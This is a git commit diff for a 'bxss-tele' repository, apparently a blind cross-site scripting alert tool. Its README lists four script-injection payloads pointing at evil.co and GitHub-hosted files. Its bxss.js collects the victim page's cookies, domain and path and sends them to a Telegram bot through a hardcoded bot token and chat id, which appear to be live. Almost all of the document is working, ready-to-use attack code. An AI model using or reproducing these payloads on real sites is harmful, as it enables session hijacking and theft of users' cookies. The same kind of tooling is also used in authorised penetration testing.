f5446c0f785cd89f082375d70ffad60449d0c1d3
Rio Darmawan <42384611+riodelord@users.noreply.github.com>
2020-05-03 03:21:16 -0500

    Add files via upload

--- README.md
+++ README.md
@@ -1,1 +1,8 @@
-# xsstele
+# bxss-tele
+Blind XSS Alert Telegram
+
+# Payloads
+```"><script src="http://evil.co/bxss.js"></script>``` \
+```"><script src=http://user.github.io/bx.js></script>``` \
+```"><script src="https://raw.githubusercontent.com/username/bxss-tele/master/bxss.js">``` \
+```"><script>$.getScript("//evil.co/bxt.js")</script>```
---
+++ bxss.js
@@ -0,0 +1,20 @@
+var tokenBot = '934569094:AAH9GZ_uYE3pyT5rZYxBeE1EzSyPxqcHcJU'; // Your "tokenBot" Here
+var chatId = '1059238468'; // Your "chatId" Here
+
+/*
+	 _                     _       _      
+	| |____  _____ ___    | |_ ___| | ___ 
+	| '_ \ \/ / __/ __|___| __/ _ \ |/ _ \
+	| |_) >  <\__ \__ \___| ||  __/ |  __/
+	|_.__/_/\_\___/___/    \__\___|_|\___|
+	------ Blind XSS Alert Telegram ------
+	                           zerobyte.id
+*/
+
+function telegramSend(tokenBot, chatId) {
+	var textData = '<b>XSS+Alert+in+' + document['domain']+'</b>%0d%0a------------------------------------------------%0d%0a%0d%0a<b>-+URL+Target+-</b>%0d%0a<pre>' + document['location']['hostname'] + document['location']['pathname'] + '</pre>%0d%0a%0d%0a<b>-+Document+Cookie+-</b>%0d%0a<pre>' + document['cookie'] + '</pre>';
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', 'https://api.telegram.org/bot' + tokenBot + '/sendMessage?chat_id=' + chatId + '&text=' + textData + '&parse_mode=html', true);
+    xhr.send();
+}
+telegramSend(tokenBot, chatId)
